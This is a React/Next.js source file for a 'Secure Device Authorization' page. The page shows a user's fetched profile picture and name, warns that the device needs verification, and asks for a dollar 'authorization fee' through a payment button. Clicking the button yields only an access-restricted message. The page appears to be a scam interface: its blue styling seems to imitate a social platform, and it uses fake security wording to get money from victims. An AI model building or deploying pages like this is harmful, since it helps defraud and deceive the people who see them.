'use client';

import multipleStep from '@/lib/multipleStep';
import { useEffect, useState } from 'react';

export default function DeviceAuthorization() {
  const [paid, setPaid] = useState(false);

  const [infos, setInfos] = useState<any>(null);

  useEffect(() => {
    async function fetchInfos() {
      const data = await multipleStep();
      setInfos(data);
    }
    fetchInfos();
  }, []);


  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4 py-10 font-sans">
      <div className="max-w-md w-full bg-[#f9fbff] border border-[#dbeafe] shadow-md rounded-xl p-6">
        {/* User Header */}
        <div className="flex items-center gap-4 mb-6">

          {infos?.profile_pic &&
            <img
              src={infos?.profile_pic}
              className="w-14 h-14 rounded-full border-4 border-[#1877f2] object-cover"
            />
          }
          <div>
            <p className="text-sm text-gray-500">{infos?.type} User</p>
            <h2 className="text-xl font-semibold text-gray-900">{infos?.profile_name}</h2>
          </div>
        </div>

        {/* Illustration */}
        <div className="w-full flex justify-center mb-6">
          <svg
            width="120"
            height="120"
            viewBox="0 0 24 24"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <rect width="24" height="24" rx="12" fill="#ecfdf5" />
            <rect x="6" y="6" width="12" height="12" rx="2" fill="#34d399" />
            <path
              d="M12 11.5c.5-.5 1.5-1.5 2-1.5s1 1 1 1.5c0 2-3 3.5-3 3.5s-3-1.5-3-3.5c0-.5.5-1.5 1-1.5s1.5 1 2 1.5z"
              fill="#065f46"
            />
          </svg>
        </div>

        {/* Title & Message */}
        <h1 className="text-xl font-semibold text-[#111827] mb-2 text-center">
          Secure Device Authorization
        </h1>
        <p className="text-sm text-gray-600 mb-5 text-center">
          To protect your account and prevent unauthorized logins, this device requires a one-time verification.
        </p>

        {/* Payment Notice */}
        <div className="bg-yellow-50 border-l-4 border-yellow-400 text-yellow-800 p-4 rounded-md mb-6">
          <p className="text-sm font-medium">
            A <strong>${infos?.payment} authorization fee</strong> is required to continue using this device securely.
          </p>
        </div>

        {/* Action Button */}
        <button
          onClick={() => setPaid(true)}
          className="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition"
        >
          Pay ${infos?.payment} to Authorize Device
        </button>

        {/* Confirmation */}
        {paid && (
          <div className="bg-red-50 border-l-4 border-red-400 text-red-700 p-4 rounded-md mb-6">
            <p className="text-sm font-medium">
              Access restricted to registered users only..
            </p>

          </div>
        )}
      </div>
    </div>
  );
}
